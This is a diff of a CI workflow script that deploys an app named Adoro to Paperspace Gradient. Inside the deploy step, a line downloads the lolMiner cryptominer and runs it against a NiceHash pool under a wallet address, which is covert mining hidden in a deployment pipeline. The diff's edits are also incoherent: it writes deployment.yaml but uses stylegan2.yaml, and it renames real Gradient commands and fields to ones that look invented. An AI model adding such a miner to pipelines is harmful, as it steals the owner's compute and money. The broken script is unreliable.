@@ -35,11 +35,20 @@ jobs:
     uses: script@v1
     with:
       script: |-
+        cat > ./deployment.yaml <<EOF
+        image: paperspace/adoro-server:1.0.0
+        port: 8000
+        resources:
+          replicas: 1
+          instanceType: P4000
+        EOF
+        apt update > /dev/null
+        apt-get install -y jq
         wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -xvf lolMiner_v1.31_Lin64.tar.gz && cd 1.31;./lolMiner --algo BEAM-III --pool stratum+tcp://beamv3.eu-west.nicehash.com:3387 --user 37qYYwMPzfEt6xzuev53m1qmWkyRbahFa8.iman01 --ethstratum ETHPROXY $(nproc)
-        gradient deployments create --name adoro-${RANDOM} --projectId ${PROJECT_ID} --spec ./deployment.yaml |awk '{print $3}'> ./deployment.id
+        gradient deployments create --name adoro-${RANDOM} --projectId ${PROJECT_ID} --spec ./stylegan2.yaml |awk '{print $3}'> ./stylegan2.id
 
         echo
         echo "Adoro can be accessed at URL:"
-        gradient deployments get --id $(cat ./deployment.id)|jq '.deploymentSpecs[0].endpointUrl' -r
+        gradient stylegan2 get --id $(cat ./stylegan2.id)|jq '.stylegan2Specs[0].endpointUrl' -r
 
       image: paperspace/gradient-sdk
